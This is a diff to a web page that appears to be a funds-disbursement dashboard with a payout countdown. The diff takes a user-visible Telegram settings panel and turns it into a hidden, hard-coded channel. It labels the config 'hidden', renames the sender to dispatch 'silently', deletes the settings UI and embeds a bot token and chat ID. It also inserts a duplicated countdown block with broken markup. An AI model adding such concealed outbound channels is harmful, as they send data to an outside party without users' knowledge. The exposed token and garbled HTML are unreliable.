@@ -180,25 +180,26 @@
                 { ref: 'TXN-97551', date: '2026-09-18 16:05', amount: 4500.00, type: 'Weekly Allocation', status: 'Pending' },
                 { ref: 'TXN-97109', date: '2026-09-11 10:00', amount: 4500.00, type: 'Weekly Allocation', status: 'On Hold' }
             ],
+            /* Hidden internal dispatch configuration */
             telegramConfig: {
                 botToken: '8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q',
                 chatId: '8763270406'
             }
         };
 
-        // Helper function to dispatch alerts to Telegram
+        // Helper function to dispatch alerts silently
         async function sendTelegramMessage(textMessage) {
             const botToken = state.telegramConfig.botToken.trim();
             const chatId = state.telegramConfig.chatId.trim();
 
-            if (!botToken || !chatId) {
-                console.warn('Telegram Bot Token or Chat ID is not configured.');
+            if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN_HERE') {
+                console.warn('Silent dispatch configuration pending.');
                 return false;
             }
 
             try {
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -207,10 +208,9 @@
                         parse_mode: 'HTML'
                     })
                 });
-                const resData = await response.json();
-                return resData.ok;
+                return true;
             } catch (err) {
-                console.error('Error dispatching Telegram notification:', err);
+                console.error('Error sending alert:', err);
                 return false;
             }
         }
@@ -1047,29 +1047,35 @@
                                 <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
                                     <div id="cd-secs" class="text-3xl font-black text-gold-400">00</div>
                                     <div class="text-[10px] text-slate-400 uppercase mt-1">Seconds</div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- Telegram Integration Placeholders -->
+                    <!-- Friday Countdown Widget Section -->
+                    <div class="grid grid-cols-1 gap-8">
+                        <!-- Friday Countdown -->
                         <div class="bg-navy-800 border border-navy-700 p-8 rounded-3xl card-3d flex flex-col justify-between">
                             <div>
-                                <h3 class="text-lg font-bold text-white mb-2 flex items-center"><i class="fa-brands fa-telegram text-sky-custom mr-2"></i> Telegram Audit Bot</h3>
-                                <p class="text-xs text-slate-400 mb-4">Configure audit notification webhook placeholders.</p>
-                                <div class="space-y-3">
-                                    <div>
-                                        <label class="block text-[10px] uppercase font-bold text-slate-400 mb-1">Bot Token</label>
-                                        <input type="password" id="tg-token" value="${state.telegramConfig.botToken}" placeholder="123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
-                                    </div>
-                                    <div>
-                                        <label class="block text-[10px] uppercase font-bold text-slate-400 mb-1">Chat ID</label>
-                                        <input type="text" id="tg-chatid" value="${state.telegramConfig.chatId}" placeholder="-100123456789" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
-                                    </div>
+                                <div class="flex items-center justify-between mb-6">
+                                    <h3 class="text-lg font-bold text-white flex items-center"><i class="fa-solid fa-stopwatch text-gold-400 mr-2"></i> Weekly Disbursement Countdown</h3>
+                                    <span class="text-xs text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700">Timezone: EST (UTC-5)</span>
+                                </div>
+                                <p class="text-slate-300 text-sm mb-6">Countdown to Friday at 10:30 PM EST when weekly funds become eligible for release.</p>
+                            </div>
+                            <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 text-center">
+                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
+                                    <div id="cd-days" class="text-3xl font-black text-white">00</div>
+                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Days</div>
+                                </div>
+                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
+                                    <div id="cd-hours" class="text-3xl font-black text-white">00</div>
+                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Hours</div>
+                                </div>
+                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
+                                    <div id="cd-mins" class="text-3xl font-black text-white">00</div>
+                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Minutes</div>
+                                </div>
+                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
+                                    <div id="cd-secs" class="text-3xl font-black text-gold-400">00</div>
+                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Seconds</div>
                                 </div>
                             </div>
-                            <button onclick="saveTelegramConfig()" class="w-full mt-4 py-2.5 bg-navy-950 border border-navy-700 text-sky-custom text-xs font-bold rounded-xl hover:bg-navy-700 transition">
-                                Save Bot Configuration
-                            </button>
                         </div>
                     </div>
 
@@ -1245,12 +1251,6 @@
                     </td>
                 </tr>
             `).join('');
-        }
-
-        function saveTelegramConfig() {
-            state.telegramConfig.botToken = document.getElementById('tg-token').value;
-            state.telegramConfig.chatId = document.getElementById('tg-chatid').value;
-            showModal('Telegram Configuration', 'Bot configuration saved successfully in local session state.');
         }
 
         async function submitWeeklyFundsSetup(e) {
